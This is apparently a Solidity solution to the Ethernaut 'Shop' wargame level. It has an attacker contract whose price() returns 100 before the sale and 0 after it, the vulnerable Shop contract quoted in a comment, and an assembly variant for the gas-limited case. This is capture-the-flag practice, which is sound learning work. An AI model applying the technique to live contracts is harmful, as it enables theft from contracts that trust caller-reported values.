//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// 0xed8072FeE1F33995b31880091089e1fd4d94Eaa9
interface IShop {
    function buy() external;
    function isSold() external returns(bool);
}

contract Buyer {

    IShop shopContract;

    constructor(address _shopContractAddr) {
        shopContract = IShop(_shopContractAddr);
    }

  function buyPwn() public {
        shopContract.buy();
  }

  function price() public returns(uint) {
    if(shopContract.isSold() == false) {
        return 100;
    }

    return 0;
  }  
}

/*

pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price{gas:3300}() >= price && !isSold) {
      isSold = true;
      price = _buyer.price{gas:3300}();
    }
  }
} 
*/ 

/**** IF THERES A GAS LIMIT OF 3300 gas sent as part of the buyer call 
then the above solution doesnt work -- as the gas consumed exceeds the supply

In that case-- we need to go down to the assembly level code as mentioned in the following github link
https://github.com/hroussille/Ethernaut-solutions/tree/master/21.%20Shop
*/




/* 
    function price() public view returns (uint256 p) {

        bytes4 sig = 0xe852e741; // keccak256("isSold()")
        address addr = 0xCa305778dC31fc201e741812fFeC903B2E6c6E05; // Change it for your instance address

        assembly {
            let rvalue := mload(0x40)
            let ptr := add(rvalue, 0x20)
            mstore(ptr, sig)
            mstore(0x40, add(rvalue, 0x40))
            let success := staticcall(3000, addr, ptr, 4, rvalue, 32)

            switch mload(rvalue)
            case 0 {
              p := 100
            }
            default {
              p:= 0
            }
        }
    }
*/